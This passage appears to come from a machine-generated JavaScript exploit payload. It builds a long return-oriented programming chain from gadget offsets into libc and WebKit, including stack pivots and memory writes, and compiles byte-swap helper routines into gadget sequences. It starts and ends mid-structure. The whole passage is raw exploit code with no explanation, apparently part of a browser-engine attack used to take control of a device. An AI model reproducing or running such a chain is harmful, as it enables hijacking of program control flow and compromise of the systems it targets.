libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+139896, //L1938
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1938:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1939:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1940:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+140024, //L1941
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+140040, //L1942
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1941:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1942:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+140152, //L1943
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+140136, //L1944
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1944:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1943:
db([0, 0]); // 0x0
//L1910:
set_gadgets([
libc_base+793877, //pop rsi
ropchain+140240, //L1946
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+140224, //L1945
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1945:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1946:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+140336, //L1947
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+140352, //L1948
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1947:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1948:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+140464, //L1949
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+140448, //L1950
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1950:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1949:
db([0, 0]); // 0x0
//L1934:
set_gadget(libc_base+793877,); //pop rsi
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+105267, //pop rdx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+10235455, //pop r9
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+785193, //xor rax, rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+11, //nop
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+793877, //pop rsi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+7438103, //mov [rsi], rax
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+792472, //pop rcx
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+206806, //pop rdi
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
webkit_base+432898, //pop r8
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+788575, //pop rax
libc_base+811575, //pop rsp
libc_base+471355, //mov [rdi], rax
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([208, 0]); // 0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967080, 4294967295]); // -0xd8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([200, 0]); // 0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967088, 4294967295]); // -0xd0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([192, 0]); // 0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967096, 4294967295]); // -0xc8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([184, 0]); // 0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967104, 4294967295]); // -0xc0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([176, 0]); // 0xb0
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967112, 4294967295]); // -0xb8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([168, 0]); // 0xa8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967272, 4294967295]); // -0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+792472 //pop rcx
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
webkit_base+5202439, //and rax, rcx
libc_base+792472, //pop rcx
__swbuf_addr,
webkit_base+2997875, //mov [rax], rcx
libc_base+793877 //pop rsi
]);
db([4294967192, 4294967295]); // -0x68
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([48, 0]); // 0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([4294967280, 4294967295]); // -0x10
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+759626, //mov rax, r8
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([32, 0]); // 0x20
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877 //pop rsi
]);
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877 //pop rsi
]);
db([128, 0]); // 0x80
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+141792, //L1951
webkit_base+7438103, //mov [rsi], rax
libc_base+811575 //pop rsp
]);
//L1951:
db([0, 0]); // 0x0
//___bswap64_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+141864, //L1952
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L1952:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+141960, //L1955
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+141992, //L1957
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L1955:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1956:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1957:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+142080, //L1958
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+142096, //L1959
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1958:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1959:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+142216, //L1962
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+142232, //L1963
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+142200, //L1961
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1961:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1962:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1963:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+142328, //L1964
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+142344, //L1965
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1964:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1965:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+142456, //L1966
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+142440, //L1967
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1967:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1966:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+142544, //L1969
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+142528, //L1968
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1968:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1969:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+142640, //L1970
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+142656, //L1971
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1970:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1971:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+142768, //L1972
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+142752, //L1973
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1973:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1972:
db([0, 0]); // 0x0
//___bswap32_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+142840, //L1974
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L1974:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+142936, //L1977
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+142968, //L1979
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L1977:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L1978:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L1979:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+143056, //L1980
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+143072, //L1981
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L1980:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1981:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+143224, //L1983
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+143256, //L1986
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+143240, //L1984
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+143208, //L1985
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1985:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1983:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1984:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1986:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+143416, //L1990
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+143384, //L1987
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+143368, //L1989
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L1989:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L1987:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1988:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L1990:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+143544, //L1992
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+143560, //L1993
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+143528, //L1991
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1991:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L1992:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1993:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+143656, //L1994
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+143672, //L1995
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L1994:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1995:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+143784, //L1996
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+143768, //L1997
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L1997:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L1996:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+143872, //L1999
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+143856, //L1998
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L1998:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L1999:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+143968, //L2000
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+143984, //L2001
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2000:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2001:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+144096, //L2002
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+144080, //L2003
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2003:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2002:
db([0, 0]); // 0x0
//___bswap16_var:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+144168, //L2004
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2004:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+144264, //L2007
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+144296, //L2009
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
webkit_base+432898 //pop r8
]);
//L2007:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2008:
db([16, 0]); // 0x10
set_gadget(libc_base+792472,); //pop rcx
//L2009:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+144384, //L2010
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+144400, //L2011
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2010:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2011:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+144560, //L2016
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+144528, //L2013
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+144512, //L2014
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2014:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2013:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2015:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L2016:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+144616, //L2017
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2017:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+144720, //L2019
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+144752, //L2021
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+144736, //L2020
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2019:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2020:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2021:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+144912, //L2025
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+144880, //L2022
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+144864, //L2024
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2024:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2022:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2023:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2025:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+145016, //L2027
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+145000, //L2026
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2026:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2027:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2028:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L2029:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+145224, //L2032
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+145192, //L2031
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2031:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2030:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2032:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+145328, //L2034
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+145312, //L2033
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2033:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2034:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+145408, //L2035
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2035:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2036:
db([16, 0]); // 0x10
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+145512, //L2038
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+145528, //L2039
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+206806 //pop rdi
]);
//L2038:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2039:
db([0, 0]); // 0x0
set_gadgets([
libc_base+270800, //mov ax, [rdi]
libc_base+793877, //pop rsi
ropchain+145688, //L2044
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+145656, //L2041
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+145640, //L2042
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2042:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2041:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2043:
db([16, 0]); // 0x10
set_gadget(libc_base+788575,); //pop rax
//L2044:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+793877, //pop rsi
ropchain+145744, //L2045
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+206806 //pop rdi
]);
//L2045:
db([0, 0]); // 0x0
set_gadgets([
libc_base+523896, //sar edi, cl
libc_base+793877, //pop rsi
ropchain+145848, //L2047
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+145880, //L2049
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+145864, //L2048
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2047:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2048:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2049:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
